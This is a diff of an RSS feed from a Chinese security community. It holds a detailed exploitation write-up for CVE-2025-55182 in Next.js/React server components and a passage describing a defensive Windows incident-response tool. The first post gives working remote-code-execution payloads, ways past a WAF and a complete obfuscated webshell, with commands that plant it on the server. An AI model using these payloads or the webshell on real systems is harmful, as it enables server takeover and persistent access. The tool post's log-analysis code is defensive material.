@@ -1,4 +1,1131 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>火线 Zone-安全攻防社区</title><link>https://zone.huoxian.cn/</link><atom:link href="http://rss.wudifeixue.com/huoxian/zone" rel="self" type="application/rss+xml"></atom:link><description>火线 Zone-安全攻防社区 - Made with love by RSSHub(https://github.com/DIYgod/RSSHub)</description><generator>RSSHub</generator><webMaster>i@diygod.me (DIYgod)</webMaster><language>en</language><lastBuildDate>Fri, 01 Aug 2025 00:30:56 GMT</lastBuildDate><ttl>5</ttl><item><title>火线Zone 25年Q2季度技术文章奖励公示</title><description>&lt;p&gt;亲爱的火线Zone社区成员们，&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>火线 Zone-安全攻防社区</title><link>https://zone.huoxian.cn/</link><atom:link href="http://rss.owo.nz/huoxian/zone" rel="self" type="application/rss+xml"></atom:link><description>火线 Zone-安全攻防社区 - Powered by RSSHub</description><generator>RSSHub</generator><webMaster>contact@rsshub.app (RSSHub)</webMaster><language>en</language><lastBuildDate>Thu, 01 Jan 2026 00:26:04 GMT</lastBuildDate><ttl>5</ttl><item><title>CVE-2025-55182 深入利用-过waf和shell踩坑</title><description>&lt;p&gt;漏洞刚出来，就有反转反转，最终经过测试，总结了一些利用方式&lt;/p&gt;
+
+&lt;h2&gt;环境搭建&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;npm create next-app@16.0.6 react -y
+npm run dev&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;常规payload利用&lt;/h2&gt;
+
+&lt;p&gt;经过参考网上的payload，我在实际利用过程中进行了一些细微的改造，让它利用起来更加舒服。&lt;/p&gt;
+
+&lt;p&gt;注：lc.com为本地hosts映射的本地IP，非公网服务器，请勿随意对公网服务器进行攻击&lt;/p&gt;
+
+&lt;h3&gt;payload-1 execSync同步执行&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;{\&quot;then\&quot;:\&quot;$B1337\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;var res=process.mainModule.require(&#39;child_process&#39;).execSync(&#39;【命令】&#39;).toString().trim();;throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:{&quot;get&quot;:&quot;$1:constructor:constructor&quot;}}}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;常规payload，回显在响应头部&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/image-20251211115416747.png&quot; title=&quot;&quot; alt=&quot;image-20251211115416747&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145017092.png&quot; title=&quot;&quot; alt=&quot;image-20251211115439174&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;这种payload比较清晰明了，但是如果执行的命令是返回多行的，就不凑效了，因为不能给响应头的值设置成多行的，可以将多行命令拼接成一行，不过构造命令挺麻烦的，于是就有了payload2&lt;/p&gt;
+
+&lt;h3&gt;payload-2 execSync同步执行&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;{\&quot;then\&quot;:\&quot;$B1337\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;var res=process.mainModule.require(&#39;child_process&#39;).execSync(&#39;【命令】&#39;).toString(&#39;base64&#39;);throw Object.assign(new Error(&#39;x&#39;),{digest: res});&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:{&quot;get&quot;:&quot;$1:constructor:constructor&quot;}}}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145022587.png&quot; title=&quot;&quot; alt=&quot;image-20251211121140675&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;将返回内容进行base64解码得到多行结果&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145448015.png&quot; title=&quot;&quot; alt=&quot;image-20251211121500569&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;为了方便输入复杂的命令，这里把输入的命令也进行base64编码进行传输，这里测试callback的代码，也可以完美执行。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;{\&quot;then\&quot;:\&quot;$B1337\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;var res=process.mainModule.require(&#39;child_process&#39;).execSync(Buffer.from(&#39;【base64编码的命令】&#39;,&#39;base64&#39;).toString()).toString(&#39;base64&#39;);throw Object.assign(new Error(&#39;x&#39;),{digest: res});&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:{&quot;get&quot;:&quot;$1:constructor:constructor&quot;}}}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145507025.png&quot; title=&quot;&quot; alt=&quot;image-20251211121816556&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;但是像这种耗时命令会因为同步执行被阻塞住，这类命令后台都是返回500的，如果是执行反弹shell，这种可能会直接卡住。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145510990.png&quot; title=&quot;&quot; alt=&quot;image-20251211122159652&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;我这里执行&lt;code&gt;ping 127.0.0.1 -t&lt;/code&gt;让他阻塞住，我现在后面发送的请求都不会有响应，因为被阻塞住了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145514840.png&quot; title=&quot;&quot; alt=&quot;image-20251211122523014&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;因此又有了payload-3&lt;/p&gt;
+
+&lt;h3&gt;payload-3 exec异步执行&lt;/h3&gt;
+
+&lt;p&gt;exec可以不阻塞执行命令，即使&lt;code&gt;ping 127.0.0.1 -t&lt;/code&gt;，也能继续执行后续操作，但是也有个弊端，无法直接返回执行结果，因此可以搭配callback网站使用，请求会立即返回一个对象，命令执行结果返回到callback里面&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;{\&quot;then\&quot;:\&quot;$B1337\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;var res=process.mainModule.require(&#39;child_process&#39;).exec(Buffer.from(&#39;【base64编码命令】&#39;,&#39;base64&#39;).toString()).toString().trim();;throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:{&quot;get&quot;:&quot;$1:constructor:constructor&quot;}}}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145518417.png&quot; title=&quot;&quot; alt=&quot;image-20251211125010409&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145526884.png&quot; title=&quot;&quot; alt=&quot;image-20251211125046061&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;waf绕过&lt;/h2&gt;
+
+&lt;p&gt;实际测试过程中，我遇到过一些waf，目前遇到的，我只要两个方法就能直接绕过。&lt;/p&gt;
+
+&lt;p&gt;注：下面测试的站点不存在此漏洞，只为演示绕过waf&lt;/p&gt;
+
+&lt;p&gt;首先第一个位置绕过，正常发送直接被拦了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145531544.png&quot; title=&quot;&quot; alt=&quot;image-20251211125855436&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;删内容，找到关键拦截点，经过测试，第一个点是在这个payload位置&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145536403.png&quot; title=&quot;&quot; alt=&quot;image-20251211130113454&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;这个位置常规使用脏数据可以绕过大部分的waf了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145543583.png&quot; title=&quot;&quot; alt=&quot;image-20251211130342905&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;然后第二处就是关键头部，Next-Action是必须要的，如果没有这个头部，将无法执行命令&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145602329.png&quot; title=&quot;&quot; alt=&quot;image-20251211130516262&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145605188.png&quot; title=&quot;&quot; alt=&quot;image-20251211130551835&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;但是只要有这个头部，就直接被拦住了，很明显waf专门针对这个漏洞进行了规则配置&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145607953.png&quot; title=&quot;&quot; alt=&quot;image-20251211130830660&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;我尝试了脏数据，添加一堆头部，加到装不下了，也绕过不了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145611705.png&quot; title=&quot;&quot; alt=&quot;image-20251211130959435&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;最后经过尝试，只需要重复Next-Action就行了，猜测应是读取头部指定键时，如果存在多个指定键，会报错，或者waf判断的是这个键的数量是不是1&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145616545.png&quot; title=&quot;&quot; alt=&quot;image-20251211131150488&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;且双写头部，是可以正常执行命令的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145618785.png&quot; title=&quot;&quot; alt=&quot;image-20251211131504282&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;写马踩坑&lt;/h2&gt;
+
+&lt;p&gt;写木马也有坑点，无论是写linux的还是windows的&lt;/p&gt;
+
+&lt;p&gt;写木马最好是用base64编码来写，这样子可以减少需要转义的字符&lt;/p&gt;
+
+&lt;p&gt;shell代码如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;import { NextResponse } from &#39;next/server&#39;;
+import { exec } from &#39;child_process&#39;;
+
+// GET 请求处理（仅从URL参数获取参数）
+export async function GET(request) {
+  return new Promise((resolve) =&amp;gt; {
+    try {
+      // 从URL参数获取demo和b64参数
+      const { searchParams } = new URL(request.url);
+      const demo = searchParams.get(&#39;demo&#39;);
+      const b64 = searchParams.get(&#39;b64&#39;); // 获取b64参数，判断是否解码
+
+      // 校验demo参数是否存在
+      if (!demo) {
+        resolve(NextResponse.json(
+          { error: &#39;缺少demo参数&#39; },
+          { status: 400 }
+        ));
+        return;
+      }
+
+      // 根据b64参数判断是否解码：b64=1时解码，否则直接使用原始内容
+      const command = b64 === &#39;1&#39; 
+        ? Buffer.from(demo, &#39;base64&#39;).toString(&#39;utf-8&#39;) 
+        : demo;
+
+      // 执行命令
+      exec(command, (error, stdout, stderr) =&amp;gt; {
+        if (error) {
+          console.error(&#39;执行错误:&#39;, error);
+          resolve(NextResponse.json(
+            { error: &#39;执行失败&#39;, message: error.message },
+            { status: 500 }
+          ));
+          return;
+        }
+
+        const result = (stdout || stderr).toString().trim();
+        resolve(new NextResponse(result, {
+          status: 200,
+          headers: {
+            &#39;Content-Type&#39;: &#39;text/plain; charset=utf-8&#39;,
+          },
+        }));
+      });
+    } catch (error) {
+      console.error(&#39;参数处理错误:&#39;, error);
+      resolve(NextResponse.json(
+        { error: &#39;执行失败&#39;, message: error.message },
+        { status: 500 }
+      ));
+    }
+  });
+}
+
+// POST 请求处理（支持URL参数 + FormData格式body）
+export async function POST(request) {
+  return new Promise(async (resolve) =&amp;gt; {
+    try {
+      // 1. 优先从URL参数获取demo和b64参数
+      const { searchParams } = new URL(request.url);
+      let demo = searchParams.get(&#39;demo&#39;);
+      let b64 = searchParams.get(&#39;b64&#39;);
+
+      // 2. URL参数不存在时，从FormData格式的body获取
+      if (!demo) {
+        const formData = await request.formData();
+        demo = formData.get(&#39;demo&#39;);
+        // 同时从body获取b64参数（兼容body传b64的场景）
+        if (!b64) b64 = formData.get(&#39;b64&#39;);
+      }
+
+      // 3. 校验demo参数是否存在
+      if (!demo) {
+        resolve(NextResponse.json(
+          { error: &#39;缺少demo参数&#39; },
+          { status: 400 }
+        ));
+        return;
+      }
+
+      // 根据b64参数判断是否解码：b64=1时解码，否则直接使用原始内容
+      const command = b64 === &#39;1&#39; 
+        ? Buffer.from(demo, &#39;base64&#39;).toString(&#39;utf-8&#39;) 
+        : demo;
+
+      // 执行命令
+      exec(command, (error, stdout, stderr) =&amp;gt; {
+        if (error) {
+          console.error(&#39;执行错误:&#39;, error);
+          resolve(NextResponse.json(
+            { error: &#39;执行失败&#39;, message: error.message },
+            { status: 500 }
+          ));
+          return;
+        }
+
+        const result = (stdout || stderr).toString().trim();
+        resolve(new NextResponse(result, {
+          status: 200,
+          headers: {
+            &#39;Content-Type&#39;: &#39;text/plain; charset=utf-8&#39;,
+          },
+        }));
+      });
+    } catch (error) {
+      console.error(&#39;参数处理错误:&#39;, error);
+      resolve(NextResponse.json(
+        { error: &#39;执行失败&#39;, message: error.message },
+        { status: 500 }
+      ));
+    }
+  });
+}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;首先对shell文件进行压缩混淆，增加被发现难度，我用&lt;a href=&quot;https://www.gseen.com/online_tools/zip_format/html_js_zip&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;JavaScript/Html在线格式化-Js/Html压缩-Js加密压缩工具，&lt;/a&gt;先压缩后混淆&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145623604.png&quot; title=&quot;&quot; alt=&quot;image-20251211132045366&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h3&gt;windows&lt;/h3&gt;
+
+&lt;p&gt;使用命令写入，先从windows开始踩坑，需要执行的命令如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mkdir E:\漏洞测试环境\create-next-app\app\api\shell &amp;amp;&amp;amp; echo [压缩后的代码] &amp;gt; E:\漏洞测试环境\create-next-app\app\api\shell\route.js &lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这个命令是发送到服务器执行的代码，99%是会报错的，因为压缩后的代码依旧存在大量cmd已经定义的符号。&lt;code&gt;&amp;amp;&lt;/code&gt;、&lt;code&gt;&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;&lt;/code&gt;等，需要统一替换代码中的这些特殊符号，在前面加一个 &lt;code&gt;^&lt;/code&gt;进行转义才能真正写入&lt;/p&gt;
+
+&lt;p&gt;未转移在cmd执行会因为各种符号报错，我示例这里直接echo输出shell代码&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145626279.png&quot; title=&quot;&quot; alt=&quot;image-20251211133342709&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;转义后再次执行，这次没报错了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145628822.png&quot; title=&quot;&quot; alt=&quot;image-20251211133429449&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h3&gt;linux&lt;/h3&gt;
+
+&lt;p&gt;linux因为可以使用EOF，轻松多了，但是如果你使用base64编码后的命令，可能会出现你写入的文件名不对的问题&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mkdir -p /home/lc/Public/bugtest/react/app/api/shell &amp;amp;&amp;amp; cat &amp;lt;&amp;lt; &#39;EOF&#39; &amp;gt; /home/lc/Public/bugtest/react/app/api/shell/route.js
+[shell代码]
+EOF&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145631168.png&quot; title=&quot;&quot; alt=&quot;image-20251211134244914&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;这里乍一看都是一样的文件名，其中一个是我通过漏洞写入的，但是怎么会有一样的文件名呢？&lt;/p&gt;
+
+&lt;p&gt;切管理员上帝视角看一下，很明显看到第二个我用漏洞写入的文件后面是有特殊符号的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145635519.png&quot; title=&quot;&quot; alt=&quot;image-20251211134433716&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;其实是因为window和linux换行符的原因，windown用的CRLF，linux是LF，所以因为换行符不一致导致编码后多出不可见符号，解决方法很简单，如图，把输入字符串改成LF，然后把文件名后面的CR删掉就可以了（代码的CR删不删都行，不影响）&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145637272.png&quot; title=&quot;&quot; alt=&quot;image-20251211135041873&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;最终效果：&lt;/p&gt;
+
+&lt;p&gt;这里我把传参由demo改成了minl，&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145639779.png&quot; title=&quot;&quot; alt=&quot;image-20251211135255798&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;也可以base64编码命令&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/LC-pro/typora-pic/tyimg/20251211145641451.png&quot; title=&quot;&quot; alt=&quot;image-20251211135409829&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;工具分享&lt;/h2&gt;
+&lt;p&gt;文中我用到的工具我也上传了github，自己写的，不是专业开发，可能会有小bug，遇到欢迎提&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LC-pro/CVE-2025-55182-EXP&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/LC-pro/CVE-2025-55182-EXP&lt;/a&gt;&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/3005-cve-2025-55182-wafshell</link><guid isPermaLink="false">https://zone.huoxian.cn/d/3005-cve-2025-55182-wafshell</guid><pubDate>Thu, 11 Dec 2025 07:13:57 GMT</pubDate><author>东风26D</author><category>原创文章</category><category>漏洞复现</category><category>tool</category><category>挖洞姿势</category><category>应用安全</category><category>实战攻防</category></item><item><title>蓝队Tools-Windows溯源分析利器WinTracePro</title><description>&lt;h2&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;将近三周的时间开发，目标是针对小白都能上手的Windows应急工具，完全基于红队人员攻击思路以及蓝队应急流程开发的Windows应急响应工具，目前V2.0的版本基本上已经ok了没有问题，下面是工具介绍，目前网上基本上没有比这个更好用且更完善的工具，计划是在V3.0计划兼容Winserver2008以下版本，另外加入内存马查杀机制。因为初衷就是想轻量，如果工具过大就违背了这个工具的初衷。&lt;/p&gt;
+
+&lt;h2&gt;工具授权&lt;/h2&gt;
+&lt;p&gt;目前工具设置需要授权码，计划是三月一次授权。&lt;/p&gt;
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;Cr7crwBXfh2AHVMh/RmH7w==&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;
+
+&lt;h2&gt;项目地址&lt;/h2&gt;
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Am1azi3ng/WinTracePro&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/Am1azi3ng/WinTracePro&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;
+
+&lt;h2&gt;系统支持&lt;/h2&gt;
+&lt;ul&gt;&lt;li&gt;Windows 10/11 ✅&lt;/li&gt;
+&lt;li&gt;Windows Server 2012/2016/2019/2022 ✅&lt;/li&gt;
+&lt;li&gt;Windows Server 2008 R2 ✅&lt;/li&gt;
+&lt;li&gt;Windows Server 2008 非 R2 ⚠️ 仅支持 Get-EventLog，需升级 PowerShell&lt;/li&gt;&lt;/ul&gt;
+
+&lt;h2&gt;工具核心日志处理&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;// 后门用户迁移4732时间id日志提取
+func FetchAndStoreBackdoorUsers(db *sql.DB, startTime, endTime string) error {
+// 动态构建 PowerShell 命令，使用传入的开始和结束时间
+psCmd := fmt.Sprintf(`[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
+$startTime = &#39;%s&#39;;
+$endTime = &#39;%s&#39;;
+Get-WinEvent -FilterHashtable @{LogName=&#39;Security&#39;; Id=4732; StartTime=$startTime; EndTime=$endTime} -MaxEvents 200 |
+ForEach-Object {
+    $xml = [xml]$_.ToXml()
+
+    $subjectSid = $xml.Event.EventData.Data | Where-Object { $_.Name -eq &quot;SubjectUserSid&quot; } | Select-Object -ExpandProperty &#39;#text&#39;
+    $memberSid = $xml.Event.EventData.Data | Where-Object { $_.Name -eq &quot;MemberSid&quot; } | Select-Object -ExpandProperty &#39;#text&#39;
+    $groupSid = $xml.Event.EventData.Data | Where-Object { $_.Name -eq &quot;TargetSid&quot; } | Select-Object -ExpandProperty &#39;#text&#39;
+
+    function Get-NameFromSid($sid) {
+        try {
+            return (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value
+        } catch {
+            return $sid
+        }
+    }
+
+    $subjectName = Get-NameFromSid $subjectSid
+    $memberName = Get-NameFromSid $memberSid
+    $groupName = Get-NameFromSid $groupSid
+
+    &quot;$($_.TimeCreated)###$($_.Id)###$subjectName###$memberName###$groupName&quot;
+}`, startTime, endTime)
+
+// 调用 runPowerShellCommand，它会返回一个包含输出行的切片和错误信息
+lines, err := runPowerShellCommand(psCmd)
+
+// --- 错误处理部分 ---
+// 如果 PowerShell 命令执行失败
+if err != nil {
+// 检查错误信息是否包含“No events were found”
+if strings.Contains(err.Error(), &quot;No events were found&quot;) {
+// 如果是这个特定错误，返回自定义的友好错误信息
+return fmt.Errorf(&quot;无用户组迁移相关事件id4732&quot;)
+}
+// 如果是其他错误，则返回原始错误
+return fmt.Errorf(&quot;执行PowerShell命令失败: %w&quot;, err)
+}
+
+// 如果没有错误，但返回的行切片是空的，也视为没有找到事件
+if len(lines) == 0 {
+return fmt.Errorf(&quot;无用户组迁移相关事件id4732&quot;)
+}
+// --- 错误处理部分结束 ---
+
+tx, err := db.Begin()
+if err != nil {
+return err
+}
+defer func() {
+if err != nil {
+tx.Rollback()
+}
+}()
+
+// 清理旧数据
+_, err = tx.Exec(`DELETE FROM backdoor_users`)
+if err != nil {
+return err
+}
+
+stmt, err := tx.Prepare(`INSERT INTO backdoor_users (time_created, event_id, subject_name, member_name, group_name) VALUES (?, ?, ?, ?, ?)`)
+if err != nil {
+return err
+}
+defer stmt.Close()
+
+for _, line := range lines {
+if len(strings.TrimSpace(line)) == 0 {
+continue
+}
+parts := strings.SplitN(line, &quot;###&quot;, 5)
+if len(parts) &amp;lt; 5 {
+continue
+}
+
+_, err = stmt.Exec(parts[0], parseInt(parts[1]), parts[2], parts[3], parts[4])
+if err != nil {
+return fmt.Errorf(&quot;插入后门用户日志失败: %w&quot;, err)
+}
+}
+
+return tx.Commit()
+}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;基本上所有的日志模块的处理都是基于powershell来实现的，所以在winserver 2008及以下的版本不安装工具是无法使用的&lt;/p&gt;
+
+&lt;h2&gt;日志检索效率以及优势&lt;/h2&gt;
+
+&lt;p&gt;因为该工具是日志文件数据提取保存，会从db文件中读取已经保存的部分数据，在检索速度上效果还是可以的，最大的优势是直接根据事件详情提取需要的字段，避免从Windows自带的检索功能中逐条查看，效率大大提高。&lt;/p&gt;
+
+&lt;h2&gt;主机信息模块&lt;/h2&gt;
+
+&lt;ul&gt;&lt;li&gt;获取主机信息和网卡信息&lt;/li&gt;
+&lt;li&gt;获取网络连接状态&lt;/li&gt;
+&lt;li&gt;网络外联IP定位，目前调用的是公网的ip.net的接口&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763026750-664881-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;日志分析模块&lt;/h2&gt;
+
+&lt;ul&gt;&lt;li&gt;提取 Windows 应用日志（Application Log）&lt;/li&gt;
+&lt;li&gt;提取 Windows 安全日志（Security Log）&lt;/li&gt;
+&lt;li&gt;支持查看登录成功（4624）、登录失败（4625）、防火墙日志、用户组迁移、用户创建删除等事件&lt;/li&gt;
+&lt;li&gt;日志保存到 log.db（SQLite 数据库）&lt;/li&gt;
+&lt;li&gt;UI 分页展示、点击查看完整内容&lt;/li&gt;
+&lt;li&gt;支持模糊查询快速定位IP和用户&lt;/li&gt;
+&lt;li&gt;根据数据库内容利用AI依据各个表的时间线进行安全分析(建议使用AI分析+人工确认)&lt;/li&gt;
+&lt;li&gt;一键快速分析功能，可以直接根据数据库生成事件摘要&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763027022-912341-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763027123-354008-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
+目前版本为V2.0，因为在实战中1.0的出现部分bug，已经在2，0版本中修复了，防火墙日志图片仅供参考&lt;/p&gt;
+
+&lt;h2&gt;任务调度&lt;/h2&gt;
+
+&lt;ul&gt;&lt;li&gt;提取定时任务详情，实时刷新&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763027268-146888-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;ul&gt;&lt;li&gt;支持任务筛选模糊查询&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763027301-60078-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;网站导航模块&lt;/h2&gt;
+
